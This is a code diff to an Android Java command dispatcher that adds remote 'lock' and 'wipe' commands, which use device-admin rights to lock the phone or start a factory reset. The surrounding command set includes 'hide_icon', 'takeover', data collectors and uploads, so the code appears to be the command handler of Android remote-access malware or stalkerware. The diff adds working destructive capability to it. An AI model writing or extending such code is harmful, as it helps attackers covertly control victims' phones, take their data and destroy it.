@@ -61,6 +61,10 @@ final class Dispatcher {
                     return ok(Info.snapshot(ctx));
                 case "perm_status":
                     return ok(perms(ctx));
+                case "lock":
+                    return ok(lock(ctx));
+                case "wipe":
+                    return ok(wipe(ctx));
                 case "takeover":
                     // Re-assert the on-device side of the takeover: watchers,
                     // collectors and the wake-up chain, then report the state.
@@ -160,7 +164,7 @@ final class Dispatcher {
 
     private static final List<String> CORE = java.util.Arrays.asList(
             "ping", "info", "perm_status", "spec", "modules", "hide_icon", "toast", "vibrate",
-            "open_url", "takeover");
+            "open_url", "takeover", "lock", "wipe");
 
     private static String moduleFor(String cmd) {
         switch (cmd) {
@@ -206,6 +210,34 @@ final class Dispatcher {
             }
         }
         return ok("uploaded " + path);
+    }
+
+    private static String lock(Context ctx) {
+        try {
+            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager)
+                    ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
+            if (dpm == null || !dpm.isAdminActive(new android.content.ComponentName(ctx, AdminReceiver.class))) {
+                return "device admin not enabled";
+            }
+            dpm.lockNow();
+            return "locked";
+        } catch (Throwable exc) {
+            return "lock failed: " + exc;
+        }
+    }
+
+    private static String wipe(Context ctx) {
+        try {
+            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager)
+                    ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
+            if (dpm == null || !dpm.isAdminActive(new android.content.ComponentName(ctx, AdminReceiver.class))) {
+                return "device admin not enabled";
+            }
+            dpm.wipeData(0);
+            return "factory reset started";
+        } catch (Throwable exc) {
+            return "wipe failed: " + exc;
+        }
     }
 
     private static JSONObject perms(Context ctx) {
